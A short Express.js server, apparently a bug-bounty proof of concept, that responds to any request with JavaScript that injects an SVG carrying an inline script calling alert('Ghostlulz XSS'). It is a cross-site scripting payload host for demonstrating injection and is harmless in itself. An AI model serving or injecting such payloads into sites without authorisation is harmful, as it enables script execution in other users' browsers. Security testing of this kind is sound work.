const express = require('express')
const app = express()
app.use('*', (req, res) => {
    console.log("Just got a request!")

     res.setHeader('Content-Type', 'application/javascript');
    const data = `
        document.body.innerHTML += '<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="300" height="100">'
                                + '<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />'
                                + '<script type="text/javascript">'
                                + '   alert("Ghostlulz XSS");'
                                + '</script>'
                                + '</svg>';
    `;
    res.send(data);
})
app.listen(process.env.PORT || 3000)
